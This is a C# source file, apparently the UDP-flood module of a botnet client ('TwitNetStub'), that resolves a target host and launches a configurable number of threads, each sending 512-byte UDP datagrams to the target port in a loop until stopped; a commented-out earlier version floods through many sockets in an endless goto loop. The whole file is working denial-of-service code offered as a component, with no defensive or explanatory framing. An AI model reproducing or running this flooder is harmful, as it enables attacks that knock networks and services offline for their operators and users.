using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace TwitNetStub.Util.Network
{
    sealed class UDP
    {
        private static ThreadStart[] tFloodingJob;
        private static Thread[] tFloodingThread;
        public static string SfHost;
        public static int Port;
        public static IPAddress IPEo;
        private static UDPRequest[] UDPClass;
        public static int Threads;

        private static bool killThread;


        public static void StartUDPFlood()
        {
            killThread = false;
            try
            {
                IPEo = Dns.GetHostEntry(new Uri(SfHost).Host).AddressList[0];
            }
            catch
            {
                IPEo = IPAddress.Parse(SfHost);
            }

            tFloodingThread = new Thread[Threads];
            tFloodingJob = new ThreadStart[Threads];
            UDPClass = new UDPRequest[Threads];

            for (int i = 0; i < Threads; i++)
            {
                UDPClass[i] = new UDPRequest(IPEo, Port);
                tFloodingJob[i] = new ThreadStart(UDPClass[i].Send);
                tFloodingThread[i] = new Thread(tFloodingJob[i]);
                tFloodingThread[i].Start();
            }
            //Config.Flooding = true;
        }

        public static void StopUDPFlood()
        {
            killThread = true;
            for (int i = 0; i < Threads; i++)
            {
                try
                {
                    tFloodingThread[i].Join(1000);
                }
                catch { }
            }
            //Config.Flooding = false;
        }

        private sealed class UDPRequest
        {
            private IPAddress IPEo;
            //private int iPSize;
            //private Socket[] pSocket;
            private int Port;

            public UDPRequest(IPAddress tIPEo, int Port)//, int tPSize)
            {
                this.IPEo = tIPEo;
                this.Port = Port;
                //this.iPSize = tPSize;
            }

            public void Send()
            {
                byte[] buf = new byte[512];
                IPEndPoint EndPoint = new IPEndPoint(this.IPEo, this.Port);

                try
                {
                    while (!killThread)
                    {
                        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        socket.Blocking = false;
                        socket.NoDelay = true;
                        socket.SendTo(buf, EndPoint);

                        Thread.Sleep(100);

                        if (socket.Connected) { socket.Disconnect(false); }
                        socket.Close();
                        socket = null;
                    }
                    if (killThread) { Thread.CurrentThread.Join(1000); }
                }
                catch { } //(Exception ex) { System.Windows.Forms.MessageBox.Show(ex.ToString() + "\n\n\n" + ex.Message); }
            }

            /*public void Send()
            {
                int iNum;
                byte[] rBuffer;

            Label:
                rBuffer = new byte[this.iPSize];

                try
                {
                    this.pSocket = new Socket[this.iUDPSockets];

                    for (iNum = 0; iNum < this.iUDPSockets; iNum++)
                    {
                        this.pSocket[iNum] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        this.pSocket[iNum].Blocking = false;
                        this.pSocket[iNum].SendTo(rBuffer, this.IPEo);
                    }

                    Thread.Sleep(100);

                    for (iNum = 0; iNum < this.iUDPSockets; iNum++)
                    {
                        if (this.pSocket[iNum].Connected) { this.pSocket[iNum].Disconnect(false); }
                        this.pSocket[iNum].Close();
                        this.pSocket[iNum] = null;
                    }

                    this.pSocket = null;
                    goto Label;
                }
                catch
                {
                    for (iNum = 0; iNum < this.iUDPSockets; iNum++)
                    {
                        try
                        {
                            if (this.pSocket[iNum].Connected) { this.pSocket[iNum].Disconnect(false); }
                            this.pSocket[iNum].Close();
                            this.pSocket[iNum] = null;
                        }
                        catch { }
                    }
                    goto Label;
                }
            }*/
        }
    }
}

